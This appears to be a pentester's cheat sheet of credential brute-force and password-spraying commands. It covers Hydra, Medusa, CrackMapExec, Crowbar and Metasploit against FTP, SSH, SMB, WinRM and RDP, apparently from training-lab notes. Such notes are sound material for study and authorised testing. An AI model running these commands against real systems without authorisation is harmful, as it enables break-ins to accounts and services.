`Note: Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.`

# Hydra 
```bash
$ hydra -L user.list -P password.list <protocol>://<IP> -t 48 -p <port>

- L user list 
- l single username 
- P pass list
- p single password
- t <num> threads
- p <port>
```

# FTP
```bash
$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 

$ hydra -L user.list -P password.list ftp://<IP> -s 21
```

# SSH
```bash
$ hydra -L user.list -P password.list ssh://<IP>
```

# SMB
```bash
$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

$ hydra -L user.list -P password.list smb://10.129.42.197

$ msf6 > use auxiliary/scanner/smb/smb_login
```

# WinRM
```bash
$ crackmapexec winrm <IP> -u user.list -p password.list
```

# RDP
```bash
$ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
$ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
$ hydra -L user.list -P password.list rdp://10.129.42.197`
```

